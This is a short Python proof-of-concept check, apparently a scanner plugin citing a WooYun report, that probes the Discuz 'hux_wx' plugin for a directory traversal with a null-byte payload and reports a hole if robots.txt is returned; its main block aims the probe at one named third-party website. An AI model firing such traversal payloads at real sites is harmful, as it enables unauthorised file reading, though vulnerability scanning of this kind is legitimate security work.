#!/usr/bin/env python
# -*- coding: utf-8 -*-
#_Author_= Yuku
#_Refer_ = http://www.wooyun.org/bugs/wooyun-2010-079517

def assign(service, arg):
    if service == "discuz":
        return True, arg

def audit(arg):
    payload = 'plugin.php?id=hux_wx:hux_wx&uid=1&mod=../../../..&ac=robots.txt%00'
    url = arg + payload
    code, head, res, errcode, _ = curl.curl(url)
    if code == 200 and "User-agent" in res:
        security_hole(url)

if __name__ == '__main__':
    from dummy import *
    audit(assign('discuz', 'http://www.yingji8.com/')[1])